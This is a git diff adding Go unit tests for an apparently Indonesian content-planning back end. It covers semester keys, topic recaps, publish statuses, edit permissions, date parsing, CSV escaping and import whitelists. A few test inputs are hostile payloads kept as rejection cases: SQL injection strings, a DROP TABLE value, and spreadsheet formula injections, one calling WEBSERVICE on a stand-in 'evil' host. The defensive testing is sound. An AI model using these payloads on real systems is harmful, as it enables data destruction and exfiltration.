@@ -6,9 +6,9 @@ import (
 
 func TestGetPeriodDateRange_Monthly(t *testing.T) {
 	tests := []struct {
-		name   string
-		year   int
-		period int
+		name     string
+		year     int
+		period   int
 		wantFrom string
 		wantTo   string
 	}{
@@ -154,6 +154,48 @@ func TestFmtPercent(t *testing.T) {
 	}
 }
 
+func TestSemesterKey(t *testing.T) {
+	tests := []struct {
+		input string
+		want  string
+	}{
+		{"2025-01-15", "2025-S1"},
+		{"2025-06-30", "2025-S1"},
+		{"2025-07-01", "2025-S2"},
+		{"2025-12-31", "2025-S2"},
+		{"2024-02-29", "2024-S1"},
+		{"2024-08-17", "2024-S2"},
+		{"", ""},
+		{"short", "short"},
+	}
+
+	for _, tt := range tests {
+		if got := semesterKey(tt.input); got != tt.want {
+			t.Errorf("semesterKey(%q) = %q, want %q", tt.input, got, tt.want)
+		}
+	}
+}
+
+func TestSemesterLabel(t *testing.T) {
+	tests := []struct {
+		input string
+		want  string
+	}{
+		{"2025-S1", "Semester 1 2025"},
+		{"2025-S2", "Semester 2 2025"},
+		{"2024-S1", "Semester 1 2024"},
+		{"2024-S2", "Semester 2 2024"},
+		{"", ""},
+		{"2025", "2025"},
+	}
+
+	for _, tt := range tests {
+		if got := semesterLabel(tt.input); got != tt.want {
+			t.Errorf("semesterLabel(%q) = %q, want %q", tt.input, got, tt.want)
+		}
+	}
+}
+
 func TestAtoiSafe(t *testing.T) {
 	// Valid
 	v, err := atoiSafe("2025")
@@ -184,5 +226,220 @@ func TestDerefStringPtr(t *testing.T) {
 	s := "hello"
 	if got := derefStringPtr(&s); got != "hello" {
 		t.Errorf("derefStringPtr(&\"hello\") = %q, want \"hello\"", got)
+	}
+}
+
+func TestBuildTopicRecap(t *testing.T) {
+	counts := map[string]int{
+		"A - Bencana & Pemulihan":                       3,
+		"B - TJSL":                                      2,
+		"Q - Penokohan":                                 5,
+		"Edukasi (Educational)":                         3,
+		"Hiburan (Entertainment)":                       2,
+		"Promosi (Promotional)":                         1,
+		"Di Balik Layar (Behind the Scenes)":            1,
+		"Interaksi & Komunitas (Engagement)":            1,
+		"Solusi Masalah & FAQ (Problem Solving / Help)": 1,
+	}
+
+	rows := buildTopicRecap(counts)
+
+	// Coded rows sorted A–Z, uncoded merged into one "?" row at the end.
+	wantCodes := []string{"A", "B", "Q", "?"}
+	if len(rows) != len(wantCodes) {
+		t.Fatalf("buildTopicRecap() returned %d rows (%+v), want %d", len(rows), rows, len(wantCodes))
+	}
+	for i, want := range wantCodes {
+		if rows[i].Code != want {
+			t.Errorf("rows[%d].Code = %q, want %q", i, rows[i].Code, want)
+		}
+	}
+
+	uncoded := rows[3]
+	if uncoded.Topic != "Tanpa Kode" {
+		t.Errorf("uncoded row Topic = %q, want %q", uncoded.Topic, "Tanpa Kode")
+	}
+	if want := 3 + 2 + 1 + 1 + 1 + 1; uncoded.Count != want {
+		t.Errorf("uncoded row Count = %d, want %d", uncoded.Count, want)
+	}
+	if rows[0].Topic != "Bencana & Pemulihan" || rows[0].Count != 3 {
+		t.Errorf("rows[0] = %+v, want code A with Topic %q and Count 3", rows[0], "Bencana & Pemulihan")
+	}
+
+	// Total content count must be preserved.
+	total := 0
+	for _, r := range rows {
+		total += r.Count
+	}
+	if want := 3 + 2 + 5 + 3 + 2 + 1 + 1 + 1 + 1; total != want {
+		t.Errorf("total count = %d, want %d", total, want)
+	}
+}
+
+func TestBuildTopicRecap_SameCodeMerged(t *testing.T) {
+	counts := map[string]int{
+		"A - Satu": 1,
+		"A-Dua":    2, // matches the regex too ("A-Dua" -> code A, topic "Dua")
+		"B - X":    3,
+	}
+	rows := buildTopicRecap(counts)
+
+	if len(rows) != 2 {
+		t.Fatalf("got %d rows (%+v), want 2", len(rows), rows)
+	}
+	if rows[0].Code != "A" || rows[0].Count != 3 || rows[0].Topic != "Satu, Dua" {
+		t.Errorf("rows[0] = %+v, want code A, Count 3, Topic %q", rows[0], "Satu, Dua")
+	}
+}
+
+func TestBuildTopicRecap_Empty(t *testing.T) {
+	if rows := buildTopicRecap(map[string]int{}); len(rows) != 0 {
+		t.Errorf("buildTopicRecap(empty) = %+v, want empty slice", rows)
+	}
+}
+
+func TestNormalizePubStatus(t *testing.T) {
+	tests := []struct {
+		input string
+		want  string
+	}{
+		// Canonical statuses pass through
+		{"PLANNED", "PLANNED"},
+		{"PUBLISHED", "PUBLISHED"},
+		{"DELAYED", "DELAYED"},
+		{"CANCELLED", "CANCELLED"},
+		// Aliases are normalized
+		{"DELAY", "DELAYED"},
+		{"CANCEL", "CANCELLED"},
+		// Anything else is rejected (case-sensitive, no free-form values)
+		{"DADAKTAKBAKU", ""},
+		{"published", ""},
+		{"", ""},
+		{"' OR '1'='1", ""},
+	}
+
+	for _, tt := range tests {
+		if got := normalizePubStatus(tt.input); got != tt.want {
+			t.Errorf("normalizePubStatus(%q) = %q, want %q", tt.input, got, tt.want)
+		}
+	}
+}
+
+func TestPublishableContentStatuses(t *testing.T) {
+	allowed := []string{"APPROVED", "READY_TO_PUBLISH", "PUBLISHED"}
+	for _, s := range allowed {
+		if !publishableContentStatuses[s] {
+			t.Errorf("publishableContentStatuses[%q] = false, want true (matches MARK_PUBLISHED rule)", s)
+		}
+	}
+
+	// Statuses that must NOT allow a publish shortcut (workflow lock states
+	// and pre-approval states).
+	blocked := []string{"DRAFT", "PLANNED", "IN_PROGRESS", "PENDING_REVIEW", "REVISION_REQUIRED"}
+	for _, s := range blocked {
+		if publishableContentStatuses[s] {
+			t.Errorf("publishableContentStatuses[%q] = true, want false — this would bypass the approval chain", s)
+		}
+	}
+}
+
+func TestCanModifyContent(t *testing.T) {
+	owner := "user-a"
+	other := "user-b"
+	createdBy := &owner
+
+	tests := []struct {
+		name      string
+		role      string
+		createdBy *string
+		userID    string
+		want      bool
+	}{
+		{"ADMIN selalu boleh", "ADMIN", createdBy, other, true},
+		{"ADMIN bahkan tanpa creator", "ADMIN", nil, other, true},
+		{"STAFF pemilik konten", "STAFF", createdBy, owner, true},
+		{"STAFF bukan pemilik", "STAFF", createdBy, other, false},
+		{"STAFF konten legacy tanpa creator", "STAFF", nil, other, true},
+		{"role kosong dianggap STAFF — bukan pemilik", "", createdBy, other, false},
+		{"role kosong dianggap STAFF — pemilik", "", createdBy, owner, true},
+	}
+
+	for _, tt := range tests {
+		if got := canModifyContent(tt.role, tt.createdBy, tt.userID); got != tt.want {
+			t.Errorf("%s: canModifyContent(%q, %v, %q) = %v, want %v",
+				tt.name, tt.role, tt.createdBy, tt.userID, got, tt.want)
+		}
+	}
+}
+
+func TestRescheduleDateValidation(t *testing.T) {
+	// parseDateStr adalah validator tanggal yang dipakai RescheduleTabungan;
+	// nilai yang lolos adalah yang valid masuk kolom date.
+	valid := []string{"2026-09-15", "2026-12-31", "2026-01-01T10:00:00Z"}
+	for _, v := range valid {
+		if _, ok := parseDateStr(v); !ok {
+			t.Errorf("parseDateStr(%q) = invalid, want valid", v)
+		}
+	}
+
+	invalid := []string{"", "bukan-tanggal", "15/09/2026", "'; DROP TABLE contents;--", "2026-13-45"}
+	for _, v := range invalid {
+		if _, ok := parseDateStr(v); ok {
+			t.Errorf("parseDateStr(%q) = valid, want invalid", v)
+		}
+	}
+}
+
+func TestCsvEscape_FormulaInjection(t *testing.T) {
+	tests := []struct {
+		input string
+		want  string
+	}{
+		// Benign values pass through untouched
+		{"Konten biasa", "Konten biasa"},
+		{"Normal text", "Normal text"},
+		{"123", "123"},
+
+		// Formula injection payloads are neutralized with a leading single quote;
+		// when the cell also contains comma/quote/newline it is quoted per RFC 4180.
+		{`=WEBSERVICE("http://evil/")`, `"'=WEBSERVICE(""http://evil/"")"`},
+		{"+SUM(A1:A10)", "'+SUM(A1:A10)"},
+		{"-1+2", "'-1+2"},
+		{"@SUM(A1)", "'@SUM(A1)"},
+		{"\tHYPERLINK(...)", "'\tHYPERLINK(...)"},
+		{"\rCMD", "\"'\rCMD\""},
+
+		// Comma/quote escaping still works AND formula prefix preserved
+		{"=cmd,batch", `"'=cmd,batch"`},
+		{`="injection"`, `"'=""injection"""`},
+	}
+	for _, tt := range tests {
+		if got := csvEscape(tt.input); got != tt.want {
+			t.Errorf("csvEscape(%q) = %q, want %q", tt.input, got, tt.want)
+		}
+	}
+}
+
+func TestImportWhitelists_CoverKnownValues(t *testing.T) {
+	// Ensure the execute-path whitelists match the validate-path expectations.
+	for f := range validFormats {
+		if !validFormats[f] {
+			t.Errorf("validFormats[%q] inconsistent", f)
+		}
+	}
+	if !validFormats["Carousel"] || !validFormats["Story"] {
+		t.Error("validFormats missing standard entries")
+	}
+	if validFormats["Malicious"] {
+		t.Error("validFormats should not accept arbitrary values")
+	}
+
+	for _, p := range []string{"EDUCATION", "ENTERTAINMENT", "INSPIRATIONAL", "PROMOTION", "INFORMATION"} {
+		if validPurposes[p] != p {
+			t.Errorf("validPurposes[%q] = %q, want %q", p, validPurposes[p], p)
+		}
+	}
+	if _, ok := validPurposes["EVIL"]; ok {
+		t.Error("validPurposes should not accept arbitrary values")
 	}
 }
